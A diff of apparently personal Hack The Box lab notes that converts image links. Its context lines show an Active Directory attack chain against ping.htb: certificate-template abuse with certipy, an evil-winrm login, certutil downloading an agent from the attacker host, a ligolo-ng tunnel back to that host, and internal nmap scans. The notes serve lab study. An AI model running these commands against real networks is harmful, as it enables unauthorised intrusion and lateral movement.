@@ -17,14 +17,14 @@ sudo vi /etc/hosts
 ```zsh
 cat /etc/hosts | grep ping.htb
 ```
-![](Pasted%20image%2020260507174138.png)
+![[Pasted image 20260507174138.png]]
 
 ## Get Ticket
 
 ```zsh
 faketime ‘now + 8 hours’ impacket-getTGT  ping.htb/c.roberts:‘AssumedBreach123’ -dc-ip 10.129.50.56
 ```
-![](Pasted%20image%2020260507174145.png)
+![[Pasted image 20260507174145.png]]
 
 # 1. certipy find
 Purpose: Enumerate exploitable certificate templates
@@ -54,7 +54,7 @@ KRB5CCNAME=c.roberts.ccache \
     faketime ‘now + 8 hours’ certipy-ad find -u c.roberts@ping.htb -k -no-pass \
     -target dc1.ping.htb -dc-ip 10.129.50.56 -vulnerable -enabled -text
 ```
-![](Pasted%20image%2020260507174256.png)
+![[Pasted image 20260507174256.png]]
 
 # 2 certipy req
 Role: Certificate Issuance (Request)
@@ -81,7 +81,7 @@ KRB5CCNAME=c.roberts.ccache \
     -target dc1.ping.htb -dc-host dc1.ping.htb -dc-ip 10.129.50.56 \
     -ca ping-DC1-CA -template TemporaryWinRM
 ```
-![](Pasted%20image%2020260507174305.png)
+![[Pasted image 20260507174305.png]]
 
 # 3 certipy auth
 Role: Kerberos authentication using a certificate (TGT acquisition)
@@ -106,7 +106,7 @@ faketime ‘now + 8 hours’ \
     certipy-ad auth -pfx c.roberts.pfx -username c.roberts -domain ping.htb \
     -dc-ip 10.129.50.56 
 ```
-![](Pasted%20image%2020260507174322.png)
+![[Pasted image 20260507174322.png]]
 
 ```zsh
 vi krb5_pingpong.conf
@@ -126,7 +126,7 @@ cat krb5_pingpong.conf
     .ping.htb = PING.HTB
     ping.htb = PING.HTB
 ```
-![](Pasted%20image%2020260507174335.png)
+![[Pasted image 20260507174335.png]]
 
 ```zsh
 export KRB5_CONFIG=krb5_pingpong.conf  
@@ -140,16 +140,16 @@ evil-winrm -i dc1.ping.htb -r ping.htb
 
 
 # Internal Discovery
-![](Pasted%20image%2020260507174342.png)
+![[Pasted image 20260507174342.png]]
 
 ## nltest
 ```zsh
 nltest /domain_trusts
 ```
-![](Pasted%20image%2020260507174349.png)
+![[Pasted image 20260507174349.png]]
 
 ## BloodHound
-![](Pasted%20image%2020260507174403.png)
+![[Pasted image 20260507174403.png]]
 
 ## Download ligolo agent
 ```zsh
@@ -157,46 +157,46 @@ certutil -urlcache -f http://10.10.15.168/agent.exe agent.exe
 ```
 
 
-![](Pasted%20image%2020260507174410.png)
+![[Pasted image 20260507174410.png]]
 
-![](Pasted%20image%2020260507174414.png)
+![[Pasted image 20260507174414.png]]
 
 ## Connect to ligolo
 ```zsh
 cp ~/github/Tools/Tunnel/ligolo-ng/proxy/ligolo-ng_proxy_0.8.3_linux_amd64/proxy . 
 ./proxy -selfcert
 ```
-![](Pasted%20image%2020260507174504.png)
+![[Pasted image 20260507174504.png]]
 
 ```zsh
 .\agent.exe -connect 10.10.15.168:11601 -ignore-cert
 ```
-![](Pasted%20image%2020260507174453.png)
+![[Pasted image 20260507174453.png]]
 
-![](Pasted%20image%2020260507174426.png)
+![[Pasted image 20260507174426.png]]
 
-![](Pasted%20image%2020260507174438.png)
+![[Pasted image 20260507174438.png]]
 
 # Lateral Movement
 ## Host scan
 ```zsh
 nmap -Pn -p 80,445,3389,22,135 192.168.2.2-10 --open
 ```
-![](Pasted%20image%2020260507174522.png)
+![[Pasted image 20260507174522.png]]
 192.168.2.2 arive
 
 ## Port scan
 ```zsh
 nmap -Pn -p- 192.168.2.2 --min-rate=5000 --open
 ```
-![](Pasted%20image%2020260507174527.png)
+![[Pasted image 20260507174527.png]]
 
 ## Port scan
 ```zsh
 nmap -Pn 192.168.2.2 -A
 ```
-![](Pasted%20image%2020260507174534.png)
-![](Pasted%20image%2020260507174540.png)
+![[Pasted image 20260507174534.png]]
+![[Pasted image 20260507174540.png]]
 pong.htb
 
 
